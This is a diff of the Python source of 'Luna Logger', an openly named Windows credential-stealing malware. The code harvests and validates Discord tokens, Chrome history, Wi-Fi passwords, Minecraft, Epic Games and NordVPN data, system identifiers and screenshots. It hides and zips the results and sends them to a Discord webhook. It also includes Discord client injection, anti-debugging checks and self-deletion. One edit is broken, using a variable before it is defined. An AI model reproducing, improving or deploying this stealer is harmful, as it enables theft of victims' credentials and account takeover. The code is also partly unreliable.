@@ -28,11 +28,10 @@ __WEBHOOK__ = "%webhook_here%"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 
-
 def main(webhook: str):
     global embed
 
-    webhook = SyncWebhook.from_url(webhook)
+    webhook = SyncWebhook.from_url(webhook, session=requests.Session())
     embed = Embed(title="Luna Logger", color=5639644)
 
     get_inf()
@@ -50,8 +49,7 @@ def main(webhook: str):
             continue
 
     embed.set_footer(text="Luna Logger | Created by Smug")
-    embed.set_thumbnail(
-        url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
+    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
     zipup()
 
@@ -72,7 +70,6 @@ def main(webhook: str):
         avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
         username="Luna")
 
-
 def Luna(webhook: str):
     debug()
 
@@ -86,7 +83,6 @@ def Luna(webhook: str):
 
     cleanup()
 
-
 def try_extract(func):
     def wrapper(*args, **kwargs):
         try:
@@ -94,7 +90,6 @@ def try_extract(func):
         except Exception:
             pass
     return wrapper
-
 
 def get_inf():
 
@@ -118,7 +113,6 @@ def get_inf():
         name="SYSTEM INFO",
         value=f'''💻 `PC Username:` **{pc_username}**\n<:computer_2:996126609650225322> `PC Name:` **{pc_name}**\n🌐 `OS:` **{computer_os}**\n\n👀 `IP:` **{ip_address}**\n🍏 `MAC:` **{mac_address}**\n🔧 `HWID:` **{hwid}**<:cpu:996126314555768882> `CPU:` **{cpu.Name}**\n<:gpu:996126996952272906> `GPU:` **{gpu.Name}**\n<:rgbram:996127801025495081> `RAM:` **{ram}GB**''',
         inline=False)
-
 
 class grabtokens():
     def __init__(self) -> None:
@@ -203,12 +197,13 @@ class grabtokens():
                                     base64.b64decode(
                                         y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(
                                         self.roaming + f'\\{disc}\\Local State'))
-                                r = requests.get(
-                                    self.baseurl,
-                                    headers={
+                                try:
+                                    r = requests.get(self.baseurl,headers={
                                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                         'Content-Type': 'application/json',
                                         'Authorization': token})
+                                except Exception:
+                                        pass
                                 if r.status_code == 200:
                                     uid = r.json()['id']
                                     if uid not in self.ids:
@@ -223,17 +218,19 @@ class grabtokens():
                             f'{path}\\{file_name}',
                             errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
-                            r = requests.get(
-                                self.baseurl,
-                                headers={
+                            try:
+                                r = requests.get(self.baseurl,headers={
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
                                     'Authorization': token})
+                            except Exception:
+                                    pass
                             if r.status_code == 200:
                                 uid = r.json()['id']
                                 if uid not in self.ids:
                                     self.tokens.append(token)
                                     self.ids.append(uid)
+
 
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(
@@ -246,12 +243,13 @@ class grabtokens():
                             f'{path}\\{_file}',
                             errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
-                            r = requests.get(
-                                self.baseurl,
-                                headers={
+                            try:
+                                r = requests.get(self.baseurl,headers={
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
                                     'Authorization': token})
+                            except Exception:
+                                    pass
                             if r.status_code == 200:
                                 uid = r.json()['id']
                                 if uid not in self.ids:
@@ -271,11 +269,14 @@ class grabtokens():
                     'Authorization': token})
 
             discord_id = r.json()['id']
-            username = r.json()['username'] + '#' + r.json()['discriminator']
+            username = r.json()['username'] + '#' + r.json()['discriminator'] + myaccount.created_at
             phone = r.json()['phone']
             email = r.json()['email']
 
+            myaccount = token.get_user(discord_id)
+
             val_name += f'{username}'
+
 
             try:
                 if r.json()['mfa_enabled']:
@@ -341,7 +342,6 @@ class grabtokens():
 
             embed.add_field(name=val_name, value=val, inline=False)
 
-
 def ss():
     ImageGrab.grab(
         bbox=None,
@@ -350,7 +350,6 @@ def ss():
         xdisplay=None
     ).save("desktop-screenshot.png")
     hide("desktop-screenshot.png")
-
 
 @try_extract
 class chrome():
@@ -443,7 +442,7 @@ class chrome():
     def history(self):
         with open(".\\google-history.txt", "w", encoding="utf-8") as f:
             f.write("https://github.com/Smug246 | Google Chrome History\n\n")
-
+    
         for path in self.google_paths:
             path += '\\History'
             if os.path.exists(path):
@@ -467,8 +466,8 @@ class chrome():
                 cursor.close()
                 conn.close()
                 os.remove("Historyvault.db")
-        hide("google-history.txt")
 
+        hide("google-history.txt")
 
 @try_extract
 class grabwifi:
@@ -507,7 +506,6 @@ class grabwifi:
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
 
-@try_extract
 class mc_tokens():
     def __init__(self):
         self.roaming = os.getenv("appdata")
@@ -517,10 +515,13 @@ class mc_tokens():
 
     def session_info(self):
         with open((".\\minecraft-sessioninfo.json"), 'w', encoding="cp437", errors='ignore') as f:
-            if os.path.exists(self.roaming + "\\.minecraft\\launcher_accounts.json"):
+            if os.path.exists(self.roaming +
+                              "\\.minecraft\\launcher_accounts.json"):
                 with open(self.roaming + "\\.minecraft\\launcher_accounts.json", "r") as g:
                     self.session = json.load(g)
                     f.write(json.dumps(self.session, indent=4))
+            else:
+                f.write("No minecraft accounts or access tokens :(")
         hide(".\\minecraft-sessioninfo.json")
 
     def user_cache(self):
@@ -529,8 +530,9 @@ class mc_tokens():
                 with open(self.roaming + "\\.minecraft\\usercache.json", "r") as g:
                     self.user = json.load(g)
                     f.write(json.dumps(self.user, indent=4))
+            else:
+                f.write("No minecraft accounts or access tokens :(")
         hide(".\\minecraft-usercache.json")
-
 
 @try_extract
 class epicgames_data():
@@ -549,8 +551,9 @@ class epicgames_data():
                     for line in f.readlines():
                         if line.startswith("Data="):
                             g.write(line.split('Data=')[1].strip())
+            else:
+                g.write("No epic games data was found :(")
         hide(".\\epicgames-data.txt")
-
 
 @try_extract
 class grabnordvpn():
@@ -567,8 +570,10 @@ class grabnordvpn():
             if os.path.exists(self.nord):
                 with open(self.nord, 'r') as n:
                     f.write(n.read())
-        hide(".\\nordvpn-data.txt")
 
+            else:
+                f.write(f"No nord vpn data was found :(")
+        hide(".\\nordvpn-data.txt")
 
 def zipup():
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
@@ -582,7 +587,6 @@ def zipup():
         zipf.write("nordvpn-data.txt")
         zipf.write("desktop-screenshot.png")
     hide(f'Luna-Logged-{os.getenv("Username")}.zip')
-
 
 def cleanup():
     for clean in [os.remove("google-passwords.txt"),
@@ -600,10 +604,8 @@ def cleanup():
         except Exception:
             pass
 
-
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
-
 
 class inject:
     def __init__(self, webhook: str):
@@ -662,7 +664,6 @@ class inject:
                                             shell=True,
                                             stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE)
-
 
 class debug:
     def __init__(self):
@@ -800,7 +801,6 @@ class debug:
             debugging = True
         if self.get_username():
             debugging = True
-
         return debugging
 
     def check_process(self):
@@ -838,7 +838,6 @@ class debug:
         os.system("del {}\\{}".format(os.path.dirname(
             __file__), os.path.basename(__file__)))
         exit()
-
 
 if __name__ == '__main__' and os.name == "nt":
     Luna(__WEBHOOK__)
